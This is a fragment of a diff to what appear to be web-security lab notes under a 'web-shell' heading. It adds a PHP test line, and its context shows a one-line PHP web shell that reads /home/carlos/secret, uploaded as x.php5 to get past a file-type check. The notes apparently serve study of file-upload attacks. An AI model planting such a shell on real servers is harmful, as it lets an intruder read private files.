@@ -4,6 +4,10 @@
 ## web-shell
 
 ```php
+<?php echo "SRC Test";?>
+```
+
+```php
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
 *x.php5*
